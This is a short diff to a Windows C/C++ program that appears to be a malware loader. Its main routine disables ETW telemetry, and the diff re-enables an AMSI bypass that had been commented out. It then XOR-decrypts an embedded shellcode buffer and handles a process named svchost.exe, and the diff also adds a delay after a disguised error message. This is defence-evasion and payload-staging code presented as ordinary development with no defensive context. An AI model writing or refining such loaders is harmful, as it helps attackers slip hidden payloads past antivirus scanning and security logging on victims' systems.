@@ -158,7 +158,7 @@ int main()
 
     // --- 2. Telemetry ---
     bypassEtw();
-    // bypassAmsi();
+    bypassAmsi();
 
     // --- 3. Decryption ---
     xorDecryptChunked(g_shellcode, g_shellcode_len, g_xor_key, g_xor_key_len);
@@ -216,7 +216,8 @@ int main()
         }
         else
         {
-            wprintf(L"[-] Process <svchost.exe> encountered an external error (code %lu), go to eventvwr.msc.\n", exitCode);
+            wprintf(L"[-] Process <svchost.exe> encountered an external error (code %lu), go to eventvwr.msc\n", exitCode);
+            Sleep(4000);
             break;
         }
     }
@@ -225,4 +226,3 @@ int main()
     CloseHandle(pi.hProcess);
     return 0;
 }
-   
